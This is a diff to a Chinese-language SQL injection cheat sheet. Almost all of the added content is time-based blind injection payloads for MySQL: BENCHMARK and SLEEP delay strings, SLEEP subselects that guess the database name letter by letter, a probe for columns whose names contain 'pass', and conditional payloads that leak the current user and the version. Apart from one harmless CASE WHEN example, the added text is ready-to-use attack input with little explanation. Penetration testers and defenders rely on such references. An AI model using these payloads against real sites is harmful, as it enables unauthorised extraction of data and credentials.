@@ -402,6 +402,12 @@ SELECT * FROM `table1` WHERE username='admin'
 	- repeat((version()),2)
 	- 来源:http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/
 
+- if 与 case when
+
+```sql
+SELECT case when 1=2 then 1 ELSE 2 END;
+```
+
 
 
 ### 杂
@@ -591,15 +597,43 @@ select * from (select * from 表名 a join 表名 b using (已知的字段,已�
 
 ### 基于时间的盲注
 
-' and if(1=0,1, sleep(10)) --+    
+The following SQL codes will delay the output from MySQL.
 
-" and if(1=0,1, sleep(10)) --+
+```
++BENCHMARK(40000000,SHA1(1337))+
+'%2Bbenchmark(3200,SHA1(1))%2B'
+AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1
+RLIKE SLEEP([SLEEPTIME])
+OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
+```
 
-) and if(1=0,1, sleep(10)) --+
+#### Using SLEEP in a subselect
 
-') and if(1=0,1, sleep(10)) --+
+```
+1 and (select sleep(10) from dual where database() like '%')#
+1 and (select sleep(10) from dual where database() like '___')# 
+1 and (select sleep(10) from dual where database() like '____')#
+1 and (select sleep(10) from dual where database() like '_____')#
+1 and (select sleep(10) from dual where database() like 'a____')#
+...
+1 and (select sleep(10) from dual where database() like 's____')#
+1 and (select sleep(10) from dual where database() like 'sa___')#
+...
+1 and (select sleep(10) from dual where database() like 'sw___')#
+1 and (select sleep(10) from dual where database() like 'swa__')#
+1 and (select sleep(10) from dual where database() like 'swb__')#
+1 and (select sleep(10) from dual where database() like 'swi__')#
+...
+1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#
+```
 
-") and if(1=0,1, sleep(10)) --+
+#### Using conditional statements
+
+```
+?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
+?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) --
+?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
+```
 
 ### **MySQL**读写文件
 
